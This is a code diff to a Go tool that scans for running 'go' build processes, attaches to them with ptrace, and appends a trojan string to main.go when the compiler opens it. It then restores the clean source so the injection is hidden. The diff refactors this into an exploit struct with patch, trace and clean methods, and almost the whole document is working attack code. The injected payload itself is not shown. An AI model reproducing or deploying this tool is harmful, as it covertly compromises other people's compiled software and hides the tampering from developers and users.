@@ -21,27 +21,116 @@ func init() {
 }
 	`
 
-func main() {
-	oldprocs := []int{}
+type xploit struct {
+	pid         int
+	cleanSource []byte
+	path        string
+	isPatched   bool
+}
 
+var xploits []xploit
+
+func (e xploit) patch() error {
+	original, err := patchfile(e.path, hackerstring)
+	if err != nil {
+		log.Printf("Unable to patch file with trojan, %v", err)
+	}
+	copy(e.cleanSource, original)
+	return err
+}
+
+func (e xploit) clean() error {
+	err := cleanfile(e.path, e.cleanSource)
+	if err != nil {
+		log.Printf("Unable to replace trojanized source with clean source, %v", err)
+	}
+
+	return err
+}
+
+func (e xploit) trace() error {
+	var regs syscall.PtraceRegs
+	var err error
+
+	exit := true
+
+	_ = syscall.PtraceAttach(e.pid)
+
+	for {
+		if exit {
+			err = syscall.PtraceGetRegs(e.pid, &regs)
+			if err != nil {
+				break
+			}
+
+			name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
+			if name == "openat" {
+
+				path, err := getOpenAtPath(e.pid, regs)
+				if err != nil {
+					fmt.Println(err)
+				}
+				e.path = path
+
+				if strings.Contains(path, "main.go") {
+					fmt.Printf("Path: %s\n", e.path)
+					fmt.Printf("Name: %s\n", name)
+					err = e.patch()
+					if err != nil {
+						log.Printf("Error patching file, %v", err)
+					}
+
+				}
+			}
+		}
+
+		err = syscall.PtraceSyscall(e.pid, 0)
+		if err != nil {
+			break
+		}
+
+		_, err = syscall.Wait4(e.pid, nil, 0, nil)
+		if err != nil {
+			break
+		}
+
+		exit = !exit
+	}
+	return nil
+}
+
+func main() {
+	xploits = []xploit{}
 	c := make(chan os.Signal)
+
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+
 	go func() {
 		<-c
 		os.Exit(1)
 	}()
+
+	//Main control loop
 	for {
-		// for _, proc := range(oldprocs) {
+		//Loop through list of exploit targets and clean up
+		for idx, xpl := range xploits {
+			_, err := ps.FindProcess(xpl.pid)
+			if err != nil {
+				err = xpl.clean()
+				if err == nil {
+					//remove target from slice
+					xploits = removeIndex(xploits, idx)
+					break
+				}
 
-		// }
-
-		oldprocs = findproc(oldprocs)
+			}
+		}
+		//find new targets
+		findproc(&xploits)
 	}
 }
 
-func findproc(oldprocs []int) []int {
-	exploitprocs := []int{}
-
+func findproc(exploit *[]xploit) {
 	procs, err := ps.Processes()
 	if err != nil {
 		fmt.Println(err)
@@ -49,82 +138,23 @@ func findproc(oldprocs []int) []int {
 	}
 
 	for _, proc := range procs {
-		if contains(oldprocs, proc.Pid()) {
-			continue
-		}
-
 		exec := proc.Executable()
 
 		if exec == "go" {
 			eh, _ := os.FindProcess(proc.Pid())
-			_, _, _ = exploit(eh.Pid)
-
-			exploitprocs = append(exploitprocs, eh.Pid)
-
+			xploit := xploit{
+				pid: eh.Pid,
+			}
+			xploits = append(xploits, xploit)
 		}
 	}
-
-	return exploitprocs
 }
 
-func exploit(pid int) ([]byte, string, int) {
-	var regs syscall.PtraceRegs
-	var err error
-	exit := true
-
-	_ = syscall.PtraceAttach(pid)
-
-	for {
-		if exit {
-			err = syscall.PtraceGetRegs(pid, &regs)
-			if err != nil {
-				break
-			}
-
-			// Uncomment to show each syscall as it's called
-			name, _ := sec.ScmpSyscall(regs.Orig_rax).GetName()
-			fmt.Println(name)
-
-			if name == "openat" {
-
-				path, err := getOpenAtPath(pid, regs)
-				if err != nil {
-					fmt.Println(err)
-				}
-
-				if strings.Contains(path, "main.go") {
-					fmt.Printf("Path: %s\n", path)
-					fmt.Printf("Name: %s\n", name)
-					data = patchfile(path)
-
-				}
-
-				return data, path, pid
-
-			}
-
-		}
-
-		err = syscall.PtraceSyscall(pid, 0)
-		if err != nil {
-			break
-		}
-
-		_, err = syscall.Wait4(pid, nil, 0, nil)
-		if err != nil {
-			break
-		}
-
-		exit = !exit
-	}
-
-}
-
-func patchfile(path string) (original []byte) {
+func patchfile(path string, trojan string) ([]byte, error) {
 	data, err := ioutil.ReadFile(path)
 	if err != nil {
-		fmt.Println(err)
-		return nil
+		log.Printf("Error Reading file %v", err)
+		return data, err
 	}
 
 	fmt.Println(path)
@@ -132,26 +162,36 @@ func patchfile(path string) (original []byte) {
 	// add init function
 	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
-		return data
+		log.Printf("Error Opening File, %v", err)
+		return data, err
 	}
 
-	if _, err := f.WriteString(hackerstring); err != nil {
-		log.Println(err)
+	if _, err := f.WriteString(trojan); err != nil {
+		log.Printf("Error writing to file, %v", err)
 	}
 
-	return data
+	return data, err
 
 }
 
-func clean(data []byte, path string) {
+func cleanfile(path string, original []byte) error {
 	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	f.Write(data)
-	f.Close()
+	_, err = f.Write(original)
+	if err != nil {
+		log.Printf("Error writing file %v", err)
+		return err
+	}
 
+	err = f.Close()
+	if err != nil {
+		log.Printf("Error closing file %v", err)
+		return err
+	}
+	return nil
 }
 
 func getOpenAtPath(pid int, regs syscall.PtraceRegs) (string, error) {
@@ -179,4 +219,8 @@ func contains(s []int, e int) bool {
 		}
 	}
 	return false
+}
+
+func removeIndex(s []xploit, index int) []xploit {
+	return append(s[:index], s[index+1:]...)
 }
